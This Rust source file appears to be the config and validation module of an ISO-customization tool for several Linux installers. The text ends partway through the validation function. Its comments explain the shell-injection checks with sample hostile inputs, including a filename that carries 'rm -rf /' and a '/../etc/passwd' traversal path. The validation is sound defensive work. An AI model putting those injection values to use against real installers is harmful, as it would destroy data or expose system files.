use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::error::{EngineError, EngineResult};

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord, Hash)]
#[serde(rename_all = "lowercase")]
pub enum Distro {
    Ubuntu,
    Mint,
    Fedora,
    Arch,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum ProfileKind {
    Minimal,
    Desktop,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum ToolStatus {
    Passed,
    Failed,
    Unavailable,
    Skipped,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(untagged)]
pub enum IsoSource {
    Path(PathBuf),
    Url(String),
}

impl Default for IsoSource {
    fn default() -> Self {
        IsoSource::Path(PathBuf::new())
    }
}

impl IsoSource {
    #[must_use]
    pub fn from_raw(input: impl Into<String>) -> Self {
        let raw = input.into();
        if raw.starts_with("http://") || raw.starts_with("https://") {
            Self::Url(raw)
        } else {
            Self::Path(PathBuf::from(raw))
        }
    }

    #[must_use]
    pub fn display_value(&self) -> String {
        match self {
            Self::Path(path) => path.display().to_string(),
            Self::Url(url) => url.clone(),
        }
    }

    #[must_use]
    pub fn is_remote(&self) -> bool {
        matches!(self, Self::Url(_))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(clippy::struct_excessive_bools)]
pub struct ScanPolicy {
    #[serde(default = "default_true")]
    pub enable_sbom: bool,
    #[serde(default = "default_true")]
    pub enable_trivy: bool,
    #[serde(default)]
    pub enable_syft_grype: bool,
    #[serde(default)]
    pub enable_open_scap: bool,
    #[serde(default = "default_true")]
    pub enable_secrets_scan: bool,
    #[serde(default)]
    pub strict_secrets: bool,
}

impl Default for ScanPolicy {
    fn default() -> Self {
        Self {
            enable_sbom: default_true(),
            enable_trivy: default_true(),
            enable_syft_grype: false,
            enable_open_scap: false,
            enable_secrets_scan: default_true(),
            strict_secrets: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestingPolicy {
    #[serde(default = "default_true")]
    pub bios: bool,
    #[serde(default = "default_true")]
    pub uefi: bool,
    #[serde(default = "default_true")]
    pub smoke: bool,
}

impl Default for TestingPolicy {
    fn default() -> Self {
        Self {
            bios: true,
            uefi: true,
            smoke: true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildConfig {
    pub name: String,
    pub source: IsoSource,
    #[serde(default)]
    pub overlay_dir: Option<PathBuf>,
    #[serde(default)]
    pub output_label: Option<String>,
    #[serde(default = "default_profile")]
    pub profile: ProfileKind,
    #[serde(default)]
    pub auto_scan: bool,
    #[serde(default)]
    pub auto_test: bool,
    #[serde(default)]
    pub scanning: ScanPolicy,
    #[serde(default)]
    pub testing: TestingPolicy,
    #[serde(default)]
    pub keep_workdir: bool,
    /// If set, the downloaded ISO's SHA-256 must match before any operation proceeds.
    #[serde(default)]
    pub expected_sha256: Option<String>,
}

impl BuildConfig {
    /// # Errors
    /// Returns an error if the YAML is invalid or fails validation.
    pub fn from_yaml_str(raw: &str) -> EngineResult<Self> {
        let cfg: Self = serde_yaml::from_str(raw)?;
        cfg.validate()?;
        Ok(cfg)
    }

    /// # Errors
    /// Returns an error if the file cannot be read or the YAML is invalid.
    pub fn from_path(path: &Path) -> EngineResult<Self> {
        let raw = std::fs::read_to_string(path)?;
        Self::from_yaml_str(&raw)
    }

    /// # Errors
    /// Returns an error if any required field is missing or invalid.
    pub fn validate(&self) -> EngineResult<()> {
        if self.name.trim().is_empty() {
            return Err(EngineError::InvalidConfig(
                "name cannot be empty".to_string(),
            ));
        }

        match &self.source {
            IsoSource::Path(path) => {
                if path.as_os_str().is_empty() {
                    return Err(EngineError::InvalidConfig(
                        "source path cannot be empty".to_string(),
                    ));
                }
            }
            IsoSource::Url(url) => {
                if !(url.starts_with("http://") || url.starts_with("https://")) {
                    return Err(EngineError::InvalidConfig(
                        "source URL must start with http:// or https://".to_string(),
                    ));
                }
            }
        }

        if let Some(path) = &self.overlay_dir {
            if !path.exists() {
                return Err(EngineError::InvalidConfig(format!(
                    "overlay_dir does not exist: {}",
                    path.display()
                )));
            }
            if !path.is_dir() {
                return Err(EngineError::InvalidConfig(format!(
                    "overlay_dir must be a directory: {}",
                    path.display()
                )));
            }
        }

        if let Some(label) = &self.output_label {
            if label.trim().is_empty() {
                return Err(EngineError::InvalidConfig(
                    "output_label cannot be blank".to_string(),
                ));
            }
            if label.len() > 32 {
                return Err(EngineError::InvalidConfig(
                    "output_label must be 32 characters or fewer".to_string(),
                ));
            }
            if !label.is_ascii() {
                return Err(EngineError::InvalidConfig(
                    "output_label must contain only ASCII characters".to_string(),
                ));
            }
            if label.chars().any(|c| c.is_ascii_control()) {
                return Err(EngineError::InvalidConfig(
                    "output_label must not contain control characters".to_string(),
                ));
            }
        }

        if self.auto_test && !self.testing.smoke {
            return Err(EngineError::InvalidConfig(
                "auto_test requires testing.smoke=true".to_string(),
            ));
        }

        Ok(())
    }
}

const fn default_true() -> bool {
    true
}

const fn default_profile() -> ProfileKind {
    ProfileKind::Minimal
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SshConfig {
    #[serde(default)]
    pub authorized_keys: Vec<String>,
    /// None = engine decides (false if keys present, true otherwise)
    #[serde(default)]
    pub allow_password_auth: Option<bool>,
    /// None = defaults to true (install openssh-server)
    #[serde(default)]
    pub install_server: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct NetworkConfig {
    #[serde(default)]
    pub dns_servers: Vec<String>,
    #[serde(default)]
    pub ntp_servers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UserConfig {
    #[serde(default)]
    pub groups: Vec<String>,
    #[serde(default)]
    pub shell: Option<String>,
    #[serde(default)]
    pub sudo_nopasswd: bool,
    #[serde(default)]
    pub sudo_commands: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FirewallConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default)]
    pub default_policy: Option<String>,
    #[serde(default)]
    pub allow_ports: Vec<String>,
    #[serde(default)]
    pub deny_ports: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ProxyConfig {
    #[serde(default)]
    pub http_proxy: Option<String>,
    #[serde(default)]
    pub https_proxy: Option<String>,
    #[serde(default)]
    pub no_proxy: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SwapConfig {
    pub size_mb: u32,
    #[serde(default)]
    pub filename: Option<String>,
    #[serde(default)]
    pub swappiness: Option<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ContainerConfig {
    #[serde(default)]
    pub docker: bool,
    #[serde(default)]
    pub podman: bool,
    #[serde(default)]
    pub docker_users: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct GrubConfig {
    #[serde(default)]
    pub timeout: Option<u32>,
    #[serde(default)]
    pub cmdline_extra: Vec<String>,
    #[serde(default)]
    pub default_entry: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct InjectConfig {
    pub source: IsoSource,
    /// Optional: if None, YAML is generated from fields below
    #[serde(default)]
    pub autoinstall_yaml: Option<PathBuf>,
    pub out_name: String,
    #[serde(default)]
    pub output_label: Option<String>,
    /// If set, the downloaded ISO's SHA-256 must match before injection proceeds.
    #[serde(default)]
    pub expected_sha256: Option<String>,

    // Identity
    #[serde(default)]
    pub hostname: Option<String>,
    #[serde(default)]
    pub username: Option<String>,
    /// Plaintext; hashed to $6$ format before writing
    #[serde(default)]
    pub password: Option<String>,
    #[serde(default)]
    pub realname: Option<String>,

    // SSH
    #[serde(default)]
    pub ssh: SshConfig,

    // Network
    #[serde(default)]
    pub network: NetworkConfig,

    // System
    #[serde(default)]
    pub timezone: Option<String>,
    #[serde(default)]
    pub locale: Option<String>,
    #[serde(default)]
    pub keyboard_layout: Option<String>,

    // Storage/Apt
    #[serde(default)]
    pub storage_layout: Option<String>, // "lvm" | "direct" | "zfs"
    #[serde(default)]
    pub apt_mirror: Option<String>,

    // Packages
    #[serde(default)]
    pub extra_packages: Vec<String>,

    // Wallpaper
    #[serde(default)]
    pub wallpaper: Option<PathBuf>,

    // Escape hatches
    #[serde(default)]
    pub extra_late_commands: Vec<String>,
    #[serde(default)]
    pub no_user_interaction: bool,

    // User / access management
    #[serde(default)]
    pub user: UserConfig,

    // Firewall
    #[serde(default)]
    pub firewall: FirewallConfig,

    // Network extras
    #[serde(default)]
    pub proxy: ProxyConfig,
    #[serde(default)]
    pub static_ip: Option<String>,
    #[serde(default)]
    pub gateway: Option<String>,

    // Services
    #[serde(default)]
    pub enable_services: Vec<String>,
    #[serde(default)]
    pub disable_services: Vec<String>,

    // Kernel
    #[serde(default)]
    pub sysctl: Vec<(String, String)>,

    // Swap
    #[serde(default)]
    pub swap: Option<SwapConfig>,

    // APT repositories (Ubuntu/Debian)
    #[serde(default)]
    pub apt_repos: Vec<String>,

    // DNF repositories (Fedora/RHEL) — each entry is a full `[id]\nbaseurl=...` stanza
    // or a shorthand URL string that gets wrapped into a minimal stanza.
    #[serde(default)]
    pub dnf_repos: Vec<String>,

    // Optional override for the primary DNF mirror base URL.
    #[serde(default)]
    pub dnf_mirror: Option<String>,

    // Pacman repositories (Arch Linux) — each entry is a `Server = https://...` mirror line.
    #[serde(default)]
    pub pacman_repos: Vec<String>,

    // Optional primary pacman mirror URL (written as the first Server= line in mirrorlist).
    #[serde(default)]
    pub pacman_mirror: Option<String>,

    // Container runtimes
    #[serde(default)]
    pub containers: ContainerConfig,

    // GRUB
    #[serde(default)]
    pub grub: GrubConfig,

    // LUKS encryption
    #[serde(default)]
    pub encrypt: bool,
    #[serde(default)]
    pub encrypt_passphrase: Option<String>,

    // Custom fstab entries
    #[serde(default)]
    pub mounts: Vec<String>,

    // Cloud-init runcmd equivalent
    #[serde(default)]
    pub run_commands: Vec<String>,

    // Target distro — None means Ubuntu (default, existing behaviour unchanged)
    #[serde(default)]
    pub distro: Option<Distro>,
}

impl InjectConfig {
    /// Validate structured fields to prevent shell injection in late-commands.
    /// Fields like `run_commands` and `extra_late_commands` are intentional
    /// escape hatches and are NOT validated here.
    ///
    /// # Errors
    /// Returns [`EngineError::InvalidConfig`] if any field contains shell-unsafe characters.
    #[allow(clippy::too_many_lines)]
    pub fn validate(&self) -> EngineResult<()> {
        // Regex-like check: only allow safe characters in structured fields.
        fn is_safe_identifier(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, underscore, dot allowed)"
                )))
            }
        }

        fn is_safe_path(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '/' | '-' | '_' | '.' | '+'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?}"
                )))
            }
        }

        fn is_safe_port(s: &str, field: &str) -> EngineResult<()> {
            // Accept "22", "22/tcp", "80:443/tcp", or named services like "ssh"
            if s.is_empty() {
                return Ok(());
            }
            if !s
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '/' | ':'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?}"
                )));
            }
            // Validate that any numeric-looking component is a valid port (1-65535).
            // Strip trailing "/tcp" or "/udp" protocol suffix before checking.
            let base = s.split('/').next().unwrap_or(s);
            for part in base.split(':') {
                if let Ok(n) = part.parse::<u32>() {
                    if n == 0 || n > 65535 {
                        return Err(EngineError::InvalidConfig(format!(
                            "{field} port number {n} is out of range (1–65535): {s:?}"
                        )));
                    }
                }
            }
            Ok(())
        }

        // Allows IPv4 (e.g. "8.8.8.8") and IPv6 (e.g. "2001:4860:4860::8888")
        // in addition to hostnames.  Allows alphanumeric, dash, dot, colon,
        // and bracket characters used in IPv6 literals like "[::1]".
        fn is_safe_network_addr(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '[' | ']'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, \
                     underscore, dot, colon, brackets allowed)"
                )))
            }
        }

        // Like is_safe_network_addr but also allows '/' for CIDR prefix notation
        // (e.g. "192.168.1.10/24" or "2001:db8::1/64").
        fn is_safe_cidr(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars().all(|c| {
                c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '[' | ']' | '/')
            }) {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, \
                     underscore, dot, colon, brackets, slash allowed)"
                )))
            }
        }

        if let Some(h) = &self.hostname {
            is_safe_identifier(h, "hostname")?;
        }
        if let Some(u) = &self.username {
            is_safe_identifier(u, "username")?;
        }

        // Timezone — written as a bare string into cloud-init YAML, Kickstart
        // `timezone` directive, and preseed `time/zone`.  Only IANA-style chars
        // are valid (e.g. "America/New_York", "UTC", "Etc/GMT+5").  Block
        // everything that is not alphanumeric, slash, underscore, dash, or plus.
        if let Some(tz) = &self.timezone {
            if tz.is_empty() {
                return Err(EngineError::InvalidConfig(
                    "timezone must not be blank".to_string(),
                ));
            }
            if !tz
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '/' | '_' | '-' | '+'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "timezone contains unsafe characters: {tz:?} \
                     (only alphanumeric, slash, underscore, dash, plus allowed)"
                )));
            }
        }

        // Locale — written as a bare string into cloud-init YAML and installer
        // directives.  Standard glibc locale names use alphanumeric, dash,
        // underscore, and dot (e.g. "en_US.UTF-8", "de_DE.ISO-8859-1").
        if let Some(loc) = &self.locale {
            if loc.is_empty() {
                return Err(EngineError::InvalidConfig(
                    "locale must not be blank".to_string(),
                ));
            }
            if !loc
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | '.'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "locale contains unsafe characters: {loc:?} \
                     (only alphanumeric, underscore, dash, dot allowed)"
                )));
            }
        }

        // Keyboard layout — written into cloud-init YAML keyboard.layout.
        // XKB layout identifiers are alphanumeric plus dash and underscore
        // (e.g. "us", "de", "gb", "us-intl").
        if let Some(kb) = &self.keyboard_layout {
            if kb.is_empty() {
                return Err(EngineError::InvalidConfig(
                    "keyboard_layout must not be blank".to_string(),
                ));
            }
            if !kb
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "keyboard_layout contains unsafe characters: {kb:?} \
                     (only alphanumeric, dash, underscore allowed)"
                )));
            }
        }
        if let Some(r) = &self.realname {
            // Realname can contain spaces
            if r.chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "realname contains shell metacharacters: {r:?}"
                )));
            }
        }

        // User config
        for g in &self.user.groups {
            is_safe_identifier(g, "group")?;
        }
        if let Some(shell) = &self.user.shell {
            is_safe_path(shell, "shell")?;
        }

        // Services
        for svc in &self.enable_services {
            is_safe_identifier(svc, "enable_service")?;
        }
        for svc in &self.disable_services {
            is_safe_identifier(svc, "disable_service")?;
        }

        // Firewall
        if let Some(policy) = &self.firewall.default_policy {
            is_safe_identifier(policy, "firewall_policy")?;
        }
        for port in &self.firewall.allow_ports {
            is_safe_port(port, "allow_port")?;
        }
        for port in &self.firewall.deny_ports {
            is_safe_port(port, "deny_port")?;
        }

        // Sysctl keys
        for (key, val) in &self.sysctl {
            is_safe_identifier(key, "sysctl key")?;
            // Sysctl values can be numeric or simple strings
            if val
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "sysctl value contains shell metacharacters: {val:?}"
                )));
            }
        }

        // Sudo commands — these are written into sudoers, so block metacharacters
        // that could break sudoers syntax or inject shell commands.
        for cmd in &self.user.sudo_commands {
            if cmd
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "sudo_command contains shell metacharacters: {cmd:?}"
                )));
            }
        }

        // APT repos — written via echo into sources.list files
        for repo in &self.apt_repos {
            if repo
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "apt_repo contains shell metacharacters: {repo:?}"
                )));
            }
            // Enforce apt sources.list line format — allow deb/deb-src lines and
            // ppa: shorthand (handled via add-apt-repository in generated late-commands).
            let trimmed = repo.trim();
            if !trimmed.is_empty()
                && !trimmed.starts_with("deb ")
                && !trimmed.starts_with("deb-src ")
                && !trimmed.starts_with("ppa:")
            {
                return Err(EngineError::InvalidConfig(format!(
                    "apt_repo must be a 'deb '/'deb-src ' sources.list entry or a 'ppa:' \
                     shorthand: {repo:?}"
                )));
            }
        }

        // Mount entries — written into fstab via echo
        for entry in &self.mounts {
            if entry
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "mount entry contains shell metacharacters: {entry:?}"
                )));
            }
        }

        // APT mirror — used in YAML and potentially late-commands
        if let Some(mirror) = &self.apt_mirror {
            if mirror
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "apt_mirror contains shell metacharacters: {mirror:?}"
                )));
            }
        }

        // Proxy URLs — written to /etc/environment via echo
        for (field, val) in [
            ("http_proxy", &self.proxy.http_proxy),
            ("https_proxy", &self.proxy.https_proxy),
        ] {
            if let Some(url) = val {
                if url
                    .chars()
                    .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
                {
                    return Err(EngineError::InvalidConfig(format!(
                        "{field} contains shell metacharacters: {url:?}"
                    )));
                }
            }
        }

        // no_proxy entries — written to /etc/environment
        for entry in &self.proxy.no_proxy {
            if entry
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "no_proxy contains shell metacharacters: {entry:?}"
                )));
            }
        }

        // Static IP — CIDR notation (e.g. "192.168.1.10/24") placed in cloud-init
        // netplan YAML, Kickstart `--ip=`, and preseed `netcfg/get_ipaddress`.
        if let Some(ip) = &self.static_ip {
            is_safe_cidr(ip, "static_ip")?;
        }

        // Gateway — plain IP or hostname placed in cloud-init routes and Kickstart
        // `--gateway=` directive.
        if let Some(gw) = &self.gateway {
            is_safe_network_addr(gw, "gateway")?;
        }

        // DNS servers — may be IPv4, IPv6, or hostnames.
        for dns in &self.network.dns_servers {
            is_safe_network_addr(dns, "dns_server")?;
        }

        // NTP servers — may be IPv4, IPv6, or hostnames.
        for ntp in &self.network.ntp_servers {
            is_safe_network_addr(ntp, "ntp_server")?;
        }

        // SSH authorized_keys — for Mint distro, each key is written via:
        //   printf '%s\n' 'KEY_CONTENT' >> …/authorized_keys
        // The key content is single-quoted so $ and ` are literal.  A single
        // quote (') inside the key content would break out of the quoting and
        // allow arbitrary shell injection.  Valid SSH public keys never contain
        // single quotes (base64 alphabet is A-Z a-z 0-9 + / =; the optional
        // comment field should not contain shell metacharacters), so this check
        // only rejects malformed or malicious input.
        //
        // The FORGEISO_KEY_EOF sentinel check is kept as defense in depth even
        // though the heredoc approach is no longer used — any future code that
        // reintroduces a heredoc for these keys would be protected.
        for key in &self.ssh.authorized_keys {
            if key.contains('\'') {
                return Err(EngineError::InvalidConfig(
                    "authorized_key must not contain a single quote ('): \
                     single-quoted shell argument would be broken"
                        .to_string(),
                ));
            }
            // Double-quote check: the Kickstart `sshkey` directive wraps the key
            // in double quotes (`sshkey --username=user "KEY"`).  A `"` in the key
            // comment would terminate the quoting early and allow injection.
            if key.contains('"') {
                return Err(EngineError::InvalidConfig(
                    "authorized_key must not contain a double quote (\"): \
                     double-quoted Kickstart sshkey argument would be broken"
                        .to_string(),
                ));
            }
            // Newlines: SSH authorized_keys entries are single-line; an embedded
            // newline would break both the Kickstart sshkey directive (line-oriented)
            // and the preseed late_command (which is also a single-line shell string).
            if key.contains('\n') || key.contains('\r') {
                return Err(EngineError::InvalidConfig(
                    "authorized_key must not contain a newline: \
                     each key must be a single line"
                        .to_string(),
                ));
            }
            for line in key.lines() {
                if line.trim() == "FORGEISO_KEY_EOF" {
                    return Err(EngineError::InvalidConfig(
                        "authorized_key must not contain a line that is exactly \
                         'FORGEISO_KEY_EOF' (heredoc sentinel collision)"
                            .to_string(),
                    ));
                }
            }
        }

        // Container users
        for u in &self.containers.docker_users {
            is_safe_identifier(u, "docker_user")?;
        }

        // Swap filename
        // The filename is interpolated as:
        //   fallocate -l {mb}M /target{fname}   → requires leading / to produce /target/swapfile
        //   chroot /target mkswap {fname}        → requires absolute path inside the chroot
        //   echo '{fname} none swap …' >> fstab  → requires absolute path
        // A relative name like "myswap" would create /targetmyswap (no separator),
        // and mkswap/fstab would reference a relative path that doesn't exist.
        if let Some(swap) = &self.swap {
            if swap.size_mb == 0 {
                return Err(EngineError::InvalidConfig(
                    "swap.size_mb must be greater than 0".to_string(),
                ));
            }
            if let Some(v) = swap.swappiness {
                if v > 100 {
                    return Err(EngineError::InvalidConfig(format!(
                        "swap.swappiness must be 0–100, got {v}"
                    )));
                }
            }
            if let Some(fname) = &swap.filename {
                is_safe_path(fname, "swap_filename")?;
                if !fname.starts_with('/') {
                    return Err(EngineError::InvalidConfig(format!(
                        "swap_filename must be an absolute path starting with '/': {fname:?}"
                    )));
                }
                // Block .. path components: fallocate and chmod are called as
                // `command /target{fname}` so a traversal like `/../etc/passwd`
                // would resolve to /etc/passwd on the installer's running system.
                if fname.split('/').any(|c| c == "..") {
                    return Err(EngineError::InvalidConfig(format!(
                        "swap_filename must not contain '..' path traversal: {fname:?}"
                    )));
                }
            }
        }

        // output_label — used as the ISO volume label (written to xorriso -V).
        // Must follow the same rules as BuildConfig: non-empty, ≤ 32 ASCII chars.
        if let Some(label) = &self.output_label {
            let label = label.trim();
            if label.is_empty() {
                return Err(EngineError::InvalidConfig(
                    "output_label must not be blank".to_string(),
                ));
            }
            if label.len() > 32 {
                return Err(EngineError::InvalidConfig(format!(
                    "output_label is too long ({} chars, max 32)",
                    label.len()
                )));
            }
            if !label.is_ascii() {
                return Err(EngineError::InvalidConfig(
                    "output_label must contain only ASCII characters".to_string(),
                ));
            }
            if label.chars().any(|c| c.is_ascii_control()) {
                return Err(EngineError::InvalidConfig(
                    "output_label must not contain control characters".to_string(),
                ));
            }
        }

        // Wallpaper — the filename component is used directly in an unquoted shell
        // `cp /cdrom/wallpaper/{filename}` command.  A malicious filename like
        // `foo; rm -rf /.jpg` would execute arbitrary code on the installer's
        // running system.  Apply the same character set as is_safe_path: only
        // alphanumeric, dash, underscore, dot, and plus are allowed.
        if let Some(wp) = &self.wallpaper {
            if let Some(fname) = wp.file_name().and_then(|n| n.to_str()) {
                if fname
                    .chars()
                    .any(|c| !c.is_alphanumeric() && !matches!(c, '-' | '_' | '.' | '+'))
                {
                    return Err(EngineError::InvalidConfig(format!(
                        "wallpaper filename contains unsafe characters: {fname:?} \
                         (only alphanumeric, dash, underscore, dot, plus allowed)"
                    )));
                }
            } else {
                return Err(EngineError::InvalidConfig(
                    "wallpaper path must have a valid UTF-8 filename component".to_string(),
                ));
            }
        }

        // GRUB — default_entry and cmdline_extra are interpolated into sed s|…|…|
        // patterns (| delimiter).  Block shell metacharacters and | itself, but
        // allow / so users can specify UUID paths (e.g. rd.luks.uuid=/dev/sda2).
        if let Some(entry) = &self.grub.default_entry {
            if entry
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "grub_default contains shell metacharacters: {entry:?}"
                )));
            }
        }
        for param in &self.grub.cmdline_extra {
            if param
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "grub_cmdline contains shell metacharacters: {param:?}"
                )));
            }
        }
        // GRUB timeout — written as a number into GRUB_TIMEOUT=N; unreasonably
        // large values produce unusable systems.  Cap at 3600 (1 hour).
        if let Some(t) = self.grub.timeout {
            if t > 3600 {
                return Err(EngineError::InvalidConfig(format!(
                    "grub_timeout must be 0–3600 seconds, got {t}"
                )));
            }
        }

        // out_name — used as a filename component joined with the output directory.
        // Block path separators (/ and \) to prevent writing outside the workspace.
        if !self.out_name.trim().is_empty() {
            let name = self.out_name.trim();
            if name.contains('/') || name.contains('\\') {
                return Err(EngineError::InvalidConfig(format!(
                    "out_name must be a plain filename, not a path: {name:?}"
                )));
            }
            // Also block shell metacharacters in case the name is passed to xorriso.
            if name
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "out_name contains shell metacharacters: {name:?}"
                )));
            }
        }

        // DNF mirror — interpolated into: sed -i 's|^baseurl=.*|baseurl={mirror}/…|'
        // The `|` character is the sed delimiter so it must be blocked to prevent
        // the substitution from being split or manipulated.  Newlines and null bytes
        // would also break the sed one-liner or produce invalid output.
        if let Some(mirror) = &self.dnf_mirror {
            if mirror.contains('|') || mirror.contains('\n') || mirror.contains('\r') {
                return Err(EngineError::InvalidConfig(format!(
                    "dnf_mirror must not contain `|` (sed delimiter) or newlines: {mirror:?}"
                )));
            }
            if mirror.contains('\0') {
                return Err(EngineError::InvalidConfig(
                    "dnf_mirror must not contain a null byte".to_string(),
                ));
            }
        }

        // DNF repos — two write paths exist in kickstart.rs:
        //   URL entries  → single-quoted:  dnf config-manager --add-repo '…'
        //   Stanza entries → heredoc:      cat > /etc/yum.repos.d/… << 'FORGEISO_REPO_EOF'
        // For URL entries a literal ' would break out of the single-quoted argument,
        // so we block it.  Stanza entries use a heredoc with a fixed sentinel so they
        // are safe against all shell metacharacters; only null bytes are rejected below.
        for repo in &self.dnf_repos {
            let trimmed = repo.trim();
            if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
                // Single-quote injection risk in the URL path.
                if trimmed.contains('\'') {
                    return Err(EngineError::InvalidConfig(format!(
                        "dnf_repo URL contains a single quote: {repo:?}"
                    )));
                }
            }
            // Both paths: null bytes and raw control chars (other than \n / \t in
            // stanzas) would produce invalid output.
            if trimmed.contains('\0') {
                return Err(EngineError::InvalidConfig(format!(
                    "dnf_repo contains a null byte: {repo:?}"
                )));
            }
            // Stanza path: the heredoc sentinel must not appear as a standalone
            // line in the stanza — it would terminate the heredoc early and
            // produce a truncated .repo file.
            for line in repo.lines() {
                if line.trim() == "FORGEISO_REPO_EOF" {
                    return Err(EngineError::InvalidConfig(
                        "dnf_repo stanza must not contain a line that is exactly \
                         'FORGEISO_REPO_EOF' (heredoc sentinel collision)"
                            .to_string(),
                    ));
                }
            }
        }

        // Pacman mirror — written as: echo 'Server = {mirror}/$repo/os/$arch' >
        // In a single-quoted shell string $ and other metacharacters are literal
        // and safe; only a ' itself can break out of the quoting.
        if let Some(mirror) = &self.pacman_mirror {
            if mirror.contains('\'') || mirror.contains('\n') || mirror.contains('\r') {
                return Err(EngineError::InvalidConfig(format!(
                    "pacman_mirror must not contain single quotes or newlines: {mirror:?}"
                )));
            }
        }

        // Pacman repos — each entry written via: echo '{line}' >> mirrorlist
        // Same single-quote injection risk; newlines would break the echo command.
        for repo in &self.pacman_repos {
            if repo.contains('\'') || repo.contains('\n') || repo.contains('\r') {
                return Err(EngineError::InvalidConfig(format!(
                    "pacman_repo must not contain single quotes or newlines: {repo:?}"
                )));
            }
        }

        // expected_sha256 — must be exactly 64 lowercase hex characters if provided.
        // A non-hex value would cause a confusing "SHA-256 mismatch" error at
        // download time rather than a clear "invalid format" error at config time.
        if let Some(sha) = &self.expected_sha256 {
            let sha = sha.trim().to_ascii_lowercase();
            if sha.len() != 64 || !sha.chars().all(|c| c.is_ascii_hexdigit()) {
                return Err(EngineError::InvalidConfig(format!(
                    "expected_sha256 must be a 64-character hex string, got {:?} ({} chars)",
                    sha,
                    sha.len()
                )));
            }
        }

        // Swap size upper bound — accepting arbitrarily large values (e.g. 999 GB)
        // would not fail validation but would produce a swap file that can never be
        // allocated, causing the installer to hang or error at runtime.
        // Cap at 128 GB (131072 MB), which is larger than any reasonable swap need.
        if let Some(swap) = &self.swap {
            if swap.size_mb > 131_072 {
                return Err(EngineError::InvalidConfig(format!(
                    "swap.size_mb {} exceeds maximum of 131072 (128 GiB)",
                    swap.size_mb
                )));
            }
        }

        // Encryption: a passphrase is required when encrypt=true.
